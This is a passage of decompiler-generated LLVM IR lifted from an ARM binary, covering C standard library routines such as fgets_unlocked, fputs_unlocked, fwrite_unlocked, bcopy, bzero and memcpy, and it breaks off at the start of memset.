  %v2_d628 = inttoptr i32 %v1_d628 to i32*
  %v3_d628 = load i32, i32* %v2_d628, align 4
  store i32 %v3_d628, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d630, i32* %r2.global-to-local, align 4
  %v1_d63497 = inttoptr i32 %v0_d630 to i32*
  %v2_d63498 = load i32, i32* %v1_d63497, align 4
  store i32 %v2_d63498, i32* %r3.global-to-local, align 4
  %v3_d638100 = icmp uge i32 %v2_d63498, %v3_d628
  store i1 %v3_d638100, i1* %cpsr_c.global-to-local, align 1
  %v9_d638106 = icmp eq i32 %v2_d63498, %v3_d628
  br i1 %v9_d638106, label %dec_label_pc_d640, label %dec_label_pc_d658

dec_label_pc_d640:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d640.dec_label_pc_d634_crit_edge
  %v0_d640107 = phi i32 [ %v1_d638.pre, %dec_label_pc_d640.dec_label_pc_d634_crit_edge ], [ %v3_d628, %dec_label_pc_d628 ]
  store i32 %v0_d640107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d650 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d650, label %dec_label_pc_d654, label %dec_label_pc_d640.dec_label_pc_d634_crit_edge

dec_label_pc_d640.dec_label_pc_d634_crit_edge:    ; preds = %dec_label_pc_d640
  %v0_d634.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d638.pre = load i32, i32* @r4, align 4
  %v1_d634 = inttoptr i32 %v0_d634.pre to i32*
  %v2_d634 = load i32, i32* %v1_d634, align 4
  store i32 %v2_d634, i32* %r3.global-to-local, align 4
  %v3_d638 = icmp uge i32 %v2_d634, %v1_d638.pre
  store i1 %v3_d638, i1* %cpsr_c.global-to-local, align 1
  %v9_d638 = icmp eq i32 %v2_d634, %v1_d638.pre
  br i1 %v9_d638, label %dec_label_pc_d640, label %dec_label_pc_d658

dec_label_pc_d654:                                ; preds = %dec_label_pc_d640
  %v0_d654 = load i32, i32* @r4, align 4
  store i32 %v0_d654, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d658

dec_label_pc_d658:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d640.dec_label_pc_d634_crit_edge, %dec_label_pc_d654
  %v0_d660 = phi i32 [ %v0_d654, %dec_label_pc_d654 ], [ %v2_d63498, %dec_label_pc_d628 ], [ %v2_d634, %dec_label_pc_d640.dec_label_pc_d634_crit_edge ]
  %v1_d658 = phi i32 [ %v0_d654, %dec_label_pc_d654 ], [ %v3_d628, %dec_label_pc_d628 ], [ %v1_d638.pre, %dec_label_pc_d640.dec_label_pc_d634_crit_edge ]
  %v3_d658 = icmp uge i32 %v0_d660, %v1_d658
  store i1 %v3_d658, i1* %cpsr_c.global-to-local, align 1
  %v9_d658 = icmp eq i32 %v0_d660, %v1_d658
  br i1 %v9_d658, label %dec_label_pc_d660, label %dec_label_pc_d658.dec_label_pc_d628_crit_edge

dec_label_pc_d658.dec_label_pc_d628_crit_edge:    ; preds = %dec_label_pc_d658
  %v0_d628.pre = load i32, i32* @r5, align 4
  %v0_d630.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d628

dec_label_pc_d660:                                ; preds = %dec_label_pc_d658
  %v2_d660 = icmp ne i32 %v1_d658, 0
  store i1 %v2_d660, i1* %cpsr_c.global-to-local, align 1
  %v7_d664 = icmp slt i32 %v1_d658, 2
  br i1 %v7_d664, label %dec_label_pc_d680, label %dec_label_pc_d668

dec_label_pc_d668:                                ; preds = %dec_label_pc_d660
  %v0_d668 = load i32, i32* @r5, align 4
  %v1_d668 = add i32 %v0_d668, 56
  store i32 %v1_d668, i32* %r0.global-to-local, align 4
  %v0_d66c = load i32, i32* %r1.global-to-local, align 4
  %v1_d66c = add i32 %v0_d66c, 129
  store i32 %v1_d66c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d680

dec_label_pc_d680:                                ; preds = %dec_label_pc_d60c, %dec_label_pc_d668, %dec_label_pc_d660, %bb71, %dec_label_pc_d548
  %v0_d680 = load i32, i32* @r5, align 4
  %v1_d680 = add i32 %v0_d680, 32
  %v2_d680 = inttoptr i32 %v1_d680 to i32*
  %v3_d680 = load i32, i32* %v2_d680, align 4
  store i32 %v3_d680, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d684 = icmp eq i32 %v3_d680, 0
  br i1 %v2_d684, label %dec_label_pc_d68c, label %dec_label_pc_d548

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d680, %dec_label_pc_d538
  %v0_d68c = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_d68c, i32* %r0.global-to-local, align 4
  %v0_d6c8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_d694:                                ; preds = %dec_label_pc_d370
  %v3_d694 = load i16, i16* %arg1, align 2
  %v4_d694 = zext i16 %v3_d694 to i32
  %v1_d698 = and i32 %v4_d694, 64
  store i32 %v1_d698, i32* %r3.global-to-local, align 4
  %v2_d698 = icmp eq i32 %v1_d698, 0
  br i1 %v2_d698, label %bb72, label %dec_label_pc_d6a4

bb72:                                             ; preds = %dec_label_pc_d694
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d694
  %v0_d6a4 = call i32 @__stdio_wcommit()
  store i32 %v0_d6a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d6a8 = icmp eq i32 %v0_d6a4, 0
  br i1 %v2_d6a8, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_d6a4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_d6a4
  %v1_d6ac = load i32, i32* @r4, align 4
  %v2_d6ac = inttoptr i32 %v1_d6ac to i16*
  %v3_d6ac = load i16, i16* %v2_d6ac, align 2
  %v4_d6ac = zext i16 %v3_d6ac to i32
  store i32 %v4_d6ac, i32* %r3.global-to-local, align 4
  %v2_d6b0 = add i32 %v1_d6ac, 8
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i32*
  %v4_d6b0 = load i32, i32* %v3_d6b0, align 4
  store i32 %v4_d6b0, i32* %r2.global-to-local, align 4
  %v2_d6b4 = and i32 %v4_d6ac, 65471
  store i32 %v2_d6b4, i32* %r3.global-to-local, align 4
  %v2_d6b8 = trunc i32 %v2_d6b4 to i16
  store i16 %v2_d6b8, i16* %v2_d6ac, align 2
  %v1_d6bc = load i32, i32* %r2.global-to-local, align 4
  %v2_d6bc = load i32, i32* @r4, align 4
  %v3_d6bc = add i32 %v2_d6bc, 28
  %v4_d6bc = inttoptr i32 %v3_d6bc to i32*
  store i32 %v1_d6bc, i32* %v4_d6bc, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_d68c, %.thread14
  %v0_d6c8 = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_d6c8.pre, %dec_label_pc_d68c ], [ 0, %.thread14 ]
  store i32 %v0_d6c8, i32* %r0.global-to-local, align 4
  store i32 %v6_d344, i32* %r5.global-to-local, align 4
  ret i32 %v0_d6c8

; uselistorder directives
  uselistorder i32 %v0_d6c8, { 1, 0 }
  uselistorder i32 %v3_d680, { 1, 2, 0 }
  uselistorder i32 %v0_d654, { 1, 0, 2 }
  uselistorder i32 %v1_d638.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d5a0, { 1, 0, 2 }
  uselistorder i32 %v1_d584.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d568, { 1, 0 }
  uselistorder i32 %v0_d50c, { 1, 0, 2 }
  uselistorder i32 %v1_d4f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d4e0, { 1, 0 }
  uselistorder i32 %v0_d4a4, { 1, 0, 2 }
  uselistorder i32 %v1_d488.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d470, { 1, 0 }
  uselistorder i32 %v0_d438, { 1, 0, 2 }
  uselistorder i32 %v1_d41c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d40c, { 1, 0 }
  uselistorder i32 %v0_d3c8, { 1, 0, 2 }
  uselistorder i32 %v1_d3ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_d384, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 11, 10, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 4, 24, 25, 26, 27, 28, 29, 31, 30, 0, 32, 33, 34, 35, 37, 36, 55, 38, 39, 40, 41, 43, 42, 1, 44, 45, 46, 47, 49, 48, 2, 50, 51, 54, 52, 53 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 19, 7, 8, 10, 9, 0, 11, 12, 13, 14, 16, 15, 5, 17, 18, 2, 20, 21, 23, 22, 1, 24, 25, 26, 39, 40, 27, 28, 29, 31, 30, 3, 32, 33, 35, 34, 4, 36, 37, 38 }
  uselistorder i32 168, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 14, 12, 15, 13, 16, 17, 21, 18, 22, 19, 23, 20, 24 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d680, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_d658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d640, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d5c0, { 1, 0 }
  uselistorder label %dec_label_pc_d5b4, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_d5a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d58c, { 1, 0 }
  uselistorder label %dec_label_pc_d548, { 1, 0 }
  uselistorder label %dec_label_pc_d538thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_d510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d4f8, { 1, 0 }
  uselistorder label %dec_label_pc_d4b8, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_d4a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d490, { 1, 0 }
  uselistorder label %dec_label_pc_d464, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d43c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d424, { 1, 0 }
  uselistorder label %dec_label_pc_d3dc, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_d3cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d3b4, { 1, 0 }
  uselistorder label %dec_label_pc_d380, { 1, 0 }
}

define i32 @function_d6dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_d6dc:
  %v0_d6dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d6dc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d6dc
  %v2_d6dc = load i32, i32* @r4, align 4
  %v8_d6dc = ashr i32 %v2_d6dc, %arg1
  %v9_d6dc = and i32 %v8_d6dc, %arg1
  %v2_d6e0 = load i32, i32* @r8, align 4
  %v5_d6e0 = udiv i32 %v2_d6e0, 2
  %v6_d6e0 = and i32 %v9_d6dc, %v5_d6e0
  %v2_d6e4 = load i32, i32* @ip, align 4
  %v3_d6e4 = and i32 %v6_d6e0, %v2_d6e4
  %v5_d6e8 = udiv i32 %v3_d6e4, 2
  %v6_d6e8 = and i32 %v3_d6e4, %v2_d6dc
  %v4_d6ec = and i32 %v6_d6e8, %v5_d6e8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d6dc, %bb
  %v5_d6ec = phi i32 [ %arg1, %dec_label_pc_d6dc ], [ %v4_d6ec, %bb ]
  ret i32 %v5_d6ec

; uselistorder directives
  uselistorder i32 %v3_d6e4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_d6f0 = load i32, i32* @r6, align 4
  %v12_d6f0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d6f4 = icmp eq i32 %arg2, 0
  store i1 %v2_d6f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_d77c, label %dec_label_pc_d764.preheader

dec_label_pc_d764.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_d7642 = add i32 %arg2, -1
  store i32 %v1_d7642, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_d7648 = icmp eq i32 %arg2, 1
  store i1 %v7_d7648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d7648, label %dec_label_pc_d76c, label %dec_label_pc_d710

dec_label_pc_d710:                                ; preds = %dec_label_pc_d764.preheader, %dec_label_pc_d764.backedge.dec_label_pc_d710_crit_edge
  %v0_d734 = phi i32 [ %v0_d710.pre, %dec_label_pc_d764.backedge.dec_label_pc_d710_crit_edge ], [ %arg3, %dec_label_pc_d764.preheader ]
  %v1_d710 = add i32 %v0_d734, 16
  %v2_d710 = inttoptr i32 %v1_d710 to i32*
  %v3_d710 = load i32, i32* %v2_d710, align 4
  store i32 %v3_d710, i32* %r2.global-to-local, align 4
  %v1_d714 = add i32 %v0_d734, 24
  %v2_d714 = inttoptr i32 %v1_d714 to i32*
  %v3_d714 = load i32, i32* %v2_d714, align 4
  store i32 %v3_d714, i32* %r3.global-to-local, align 4
  %v3_d718 = icmp uge i32 %v3_d710, %v3_d714
  store i1 %v3_d718, i1* %cpsr_c.global-to-local, align 1
  %v9_d718 = icmp eq i32 %v3_d710, %v3_d714
  store i1 %v9_d718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d718, label %dec_label_pc_d734, label %dec_label_pc_d720

dec_label_pc_d720:                                ; preds = %dec_label_pc_d710
  %v1_d720 = inttoptr i32 %v3_d710 to i8*
  %v2_d720 = load i8, i8* %v1_d720, align 1
  %v3_d720 = zext i8 %v2_d720 to i32
  store i32 %v3_d720, i32* %r3.global-to-local, align 4
  %v5_d720 = add i32 %v3_d710, 1
  store i32 %v5_d720, i32* %r2.global-to-local, align 4
  %v2_d724 = load i32, i32* @r5, align 4
  %v3_d724 = inttoptr i32 %v2_d724 to i8*
  store i8 %v2_d720, i8* %v3_d724, align 1
  %v4_d724 = load i32, i32* @r5, align 4
  %v5_d724 = add i32 %v4_d724, 1
  store i32 %v5_d724, i32* @r5, align 4
  %v0_d728 = load i32, i32* %r3.global-to-local, align 4
  %v2_d728 = icmp ugt i32 %v0_d728, 9
  store i1 %v2_d728, i1* %cpsr_c.global-to-local, align 1
  %v7_d728 = icmp eq i32 %v0_d728, 10
  store i1 %v7_d728, i1* %cpsr_z.global-to-local, align 1
  %v0_d72c = load i32, i32* %r2.global-to-local, align 4
  %v1_d72c = load i32, i32* @r4, align 4
  %v2_d72c = add i32 %v1_d72c, 16
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v0_d72c, i32* %v3_d72c, align 4
  br i1 %v7_d728, label %dec_label_pc_d76c, label %dec_label_pc_d764.backedge

dec_label_pc_d734:                                ; preds = %dec_label_pc_d710
  %v1_d734 = inttoptr i32 %v0_d734 to i16*
  %v3_d738 = call i32 @getc_unlocked(i16* %v1_d734)
  %v3_d73c = icmp eq i32 %v3_d738, -1
  store i1 %v3_d73c, i1* %cpsr_c.global-to-local, align 1
  %v8_d73c = icmp eq i32 %v3_d738, -1
  store i1 %v8_d73c, i1* %cpsr_z.global-to-local, align 1
  %v1_d740 = urem i32 %v3_d738, 256
  store i32 %v1_d740, i32* %r3.global-to-local, align 4
  br i1 %v3_d73c, label %dec_label_pc_d748, label %dec_label_pc_d760

dec_label_pc_d748:                                ; preds = %dec_label_pc_d734
  %v0_d748 = load i32, i32* @r4, align 4
  %v1_d748 = inttoptr i32 %v0_d748 to i16*
  %v2_d748 = load i16, i16* %v1_d748, align 2
  %v3_d748 = zext i16 %v2_d748 to i32
  store i32 %v3_d748, i32* %r3.global-to-local, align 4
  %v1_d74c = and i32 %v3_d748, 8
  %v2_d74c = icmp eq i32 %v1_d74c, 0
  store i1 %v2_d74c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d74c, label %dec_label_pc_d76c, label %dec_label_pc_d77c

dec_label_pc_d760:                                ; preds = %dec_label_pc_d734
  %v1_d758 = trunc i32 %v3_d738 to i8
  %v2_d758 = load i32, i32* @r5, align 4
  %v3_d758 = inttoptr i32 %v2_d758 to i8*
  store i8 %v1_d758, i8* %v3_d758, align 1
  %v4_d758 = load i32, i32* @r5, align 4
  %v5_d758 = add i32 %v4_d758, 1
  store i32 %v5_d758, i32* @r5, align 4
  %v0_d75c = load i32, i32* %r3.global-to-local, align 4
  %v2_d75c = icmp ugt i32 %v0_d75c, 9
  store i1 %v2_d75c, i1* %cpsr_c.global-to-local, align 1
  %v7_d75c = icmp eq i32 %v0_d75c, 10
  store i1 %v7_d75c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d75c, label %dec_label_pc_d76c, label %dec_label_pc_d764.backedge

dec_label_pc_d764.backedge:                       ; preds = %dec_label_pc_d760, %dec_label_pc_d720
  %v0_d764 = load i32, i32* @r6, align 4
  %v1_d764 = add i32 %v0_d764, -1
  store i32 %v1_d764, i32* @r6, align 4
  %v2_d764 = icmp ne i32 %v0_d764, 0
  store i1 %v2_d764, i1* %cpsr_c.global-to-local, align 1
  %v7_d764 = icmp eq i32 %v0_d764, 1
  store i1 %v7_d764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d764, label %dec_label_pc_d76c, label %dec_label_pc_d764.backedge.dec_label_pc_d710_crit_edge

dec_label_pc_d764.backedge.dec_label_pc_d710_crit_edge: ; preds = %dec_label_pc_d764.backedge
  %v0_d710.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d710

dec_label_pc_d76c:                                ; preds = %dec_label_pc_d760, %dec_label_pc_d764.backedge, %dec_label_pc_d720, %dec_label_pc_d764.preheader, %dec_label_pc_d748
  %v0_d76c = load i32, i32* @r5, align 4
  %v1_d76c = load i32, i32* @r7, align 4
  %v3_d76c = icmp uge i32 %v0_d76c, %v1_d76c
  store i1 %v3_d76c, i1* %cpsr_c.global-to-local, align 1
  %v9_d76c = icmp eq i32 %v0_d76c, %v1_d76c
  store i1 %v9_d76c, i1* %cpsr_z.global-to-local, align 1
  %v2_d770 = xor i1 %v9_d76c, true
  %v3_d770 = and i1 %v3_d76c, %v2_d770
  br i1 %v3_d770, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_d76c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_d774 = inttoptr i32 %v0_d76c to i8*
  store i8 0, i8* %v7_d774, align 1
  %v0_d778.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_d778.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_d76c, %bb
  %v1_d778 = phi i1 [ %v1_d778.pre, %bb ], [ %v9_d76c, %dec_label_pc_d76c ]
  %v0_d778 = phi i1 [ %v0_d778.pre, %bb ], [ %v3_d76c, %dec_label_pc_d76c ]
  %v2_d778 = xor i1 %v1_d778, true
  %v3_d778 = and i1 %v0_d778, %v2_d778
  br i1 %v3_d778, label %.dec_label_pc_d780_crit_edge, label %dec_label_pc_d77c

.dec_label_pc_d780_crit_edge:                     ; preds = %.thread14
  %v0_d780.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d780

dec_label_pc_d77c:                                ; preds = %entry, %dec_label_pc_d748, %.thread14
  br label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %.dec_label_pc_d780_crit_edge, %dec_label_pc_d77c
  %v0_d780 = phi i32 [ %v0_d780.pre, %.dec_label_pc_d780_crit_edge ], [ 0, %dec_label_pc_d77c ]
  store i32 %v9_d6f0, i32* @r6, align 4
  store i32 %v12_d6f0, i32* @r7, align 4
  ret i32 %v0_d780

; uselistorder directives
  uselistorder i1 %v9_d76c, { 1, 0, 2 }
  uselistorder i32 %v1_d76c, { 1, 0 }
  uselistorder i32 %v0_d76c, { 0, 2, 1 }
  uselistorder i32 %v0_d764, { 2, 0, 1 }
  uselistorder i32 %v0_d75c, { 1, 0 }
  uselistorder i32 %v3_d738, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d728, { 1, 0 }
  uselistorder i32 %v3_d710, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_d734, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_d780, { 1, 0 }
  uselistorder label %dec_label_pc_d77c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_d76c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_d710, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_d790 = load i32, i32* @r4, align 4
  store i32 %v3_d790, i32* %stack_var_-16, align 4
  %v6_d790 = load i32, i32* @r5, align 4
  %v9_d790 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_d79c = call i32 @strlen(i8* %arg1)
  store i32 %v3_d79c, i32* @r6, align 4
  %v0_d7a4 = load i32, i32* @r5, align 4
  %v0_d7a8 = load i32, i32* @r4, align 4
  %v5_d7b4 = inttoptr i32 %v0_d7a4 to i16*
  %v6_d7b4 = call i32 @__GI_fwrite_unlocked(i32 %v0_d7a8, i32 1, i32 %v3_d79c, i16* %v5_d7b4)
  %v1_d7b8 = load i32, i32* @r6, align 4
  %v9_d7b8 = icmp eq i32 %v6_d7b4, %v1_d7b8
  br i1 %v9_d7b8, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_d7c4 = phi i32 [ %v6_d7b4, %entry ], [ -1, %bb ]
  %v2_d7c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d7c0, i32* @r4, align 4
  store i32 %v6_d790, i32* @r5, align 4
  store i32 %v9_d790, i32* @r6, align 4
  ret i32 %v1_d7c4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg4 to i32
  %v9_d7c8 = load i32, i32* @r6, align 4
  %v12_d7c8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_d7d0 = load i16, i16* %arg4, align 2
  %v1_d7d4 = and i16 %v3_d7d0, 192
  %v2_d7d8 = icmp eq i16 %v1_d7d4, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_d7d8, label %dec_label_pc_d804, label %dec_label_pc_d7f0

dec_label_pc_d7f0:                                ; preds = %entry
  %v4_d7f8 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_d7fc = icmp eq i32 %v4_d7f8, 0
  br i1 %v2_d7fc, label %dec_label_pc_d804thread-pre-split, label %dec_label_pc_d86c

dec_label_pc_d804thread-pre-split:                ; preds = %dec_label_pc_d7f0
  %v0_d804.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_d804

dec_label_pc_d804:                                ; preds = %dec_label_pc_d804thread-pre-split, %entry
  %v0_d828 = phi i32 [ %v0_d804.pr, %dec_label_pc_d804thread-pre-split ], [ %arg2, %entry ]
  %v2_d804 = icmp eq i32 %v0_d828, 0
  br i1 %v2_d804, label %dec_label_pc_d86c, label %bb

bb:                                               ; preds = %dec_label_pc_d804
  %v1_d808 = load i32, i32* @r6, align 4
  %v3_d808 = icmp eq i32 %v1_d808, 0
  br i1 %v3_d808, label %dec_label_pc_d86c, label %dec_label_pc_d810

dec_label_pc_d810:                                ; preds = %bb
  %v2_d818 = udiv i32 -1, %v0_d828
  %tmp9 = icmp ugt i32 %v1_d808, %v2_d818
  %v0_d844 = load i32, i32* @r5, align 4
  %v1_d844 = inttoptr i32 %v0_d844 to i16*
  br i1 %tmp9, label %dec_label_pc_d844, label %dec_label_pc_d824

dec_label_pc_d824:                                ; preds = %dec_label_pc_d810
  %v2_d828 = mul i32 %v1_d808, %v0_d828
  %v0_d82c = load i32, i32* @r7, align 4
  %v5_d830 = call i32 @__stdio_fwrite(i32 %v0_d82c, i32 %v2_d828, i16* %v1_d844)
  %v0_d834 = load i32, i32* @r4, align 4
  %v2_d838 = udiv i32 %v5_d830, %v0_d834
  store i32 %v2_d838, i32* @r1, align 4
  br label %dec_label_pc_d870

dec_label_pc_d844:                                ; preds = %dec_label_pc_d810
  %v2_d844 = load i16, i16* %v1_d844, align 2
  %v1_d848 = or i16 %v2_d844, 8
  store i16 %v1_d848, i16* %v1_d844, align 2
  %v0_d854 = call i32 @__aeabi_read_tp()
  %v3_d858 = load i16, i16* @global_var_23164.175, align 2
  %v4_d858 = sext i16 %v3_d858 to i32
  store i32 0, i32* @r1, align 4
  %v3_d864 = add i32 %v4_d858, %v0_d854
  %v4_d864 = inttoptr i32 %v3_d864 to i32*
  store i32 22, i32* %v4_d864, align 4
  %v0_d870.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_d870

dec_label_pc_d86c:                                ; preds = %dec_label_pc_d804, %dec_label_pc_d7f0, %bb
  store i32 0, i32* @r1, align 4
  br label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %dec_label_pc_d844, %dec_label_pc_d824, %dec_label_pc_d86c
  %v0_d870 = phi i32 [ %v0_d870.pre, %dec_label_pc_d844 ], [ %v2_d838, %dec_label_pc_d824 ], [ 0, %dec_label_pc_d86c ]
  store i32 %v9_d7c8, i32* @r6, align 4
  store i32 %v12_d7c8, i32* @r7, align 4
  ret i32 %v0_d870

; uselistorder directives
  uselistorder i16* %v1_d844, { 0, 2, 1 }
  uselistorder i32 %v1_d808, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_d870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d86c, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_d89c = inttoptr i32 %arg2 to i8*
  %v3_d89c = call i32 @_memcpy(i8* %v2_d89c, i32 %arg1)
  ret i32 %v3_d89c
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_d8a8 = load i32, i32* @r0, align 4
  %v3_d8a8 = inttoptr i32 %v0_d8a8 to i8*
  %v4_d8a8 = call i32 @__GI_memset(i8* %v3_d8a8, i32 0, i32 %arg1)
  ret i32 %v4_d8a8
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_d8b0 = load i32, i32* @r0, align 4
  %v1_d8b0 = load i32, i32* @r1, align 4
  %v2_d8b0 = inttoptr i32 %v0_d8b0 to i8*
  %v3_d8b0 = call i32 @_memcpy(i8* %v2_d8b0, i32 %v1_d8b0)
  ret i32 %v3_d8b0
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_d8c4 = icmp eq i32 %arg3, 8
  store i1 %v8_d8c4, i1* %cpsr_z.global-to-local, align 1
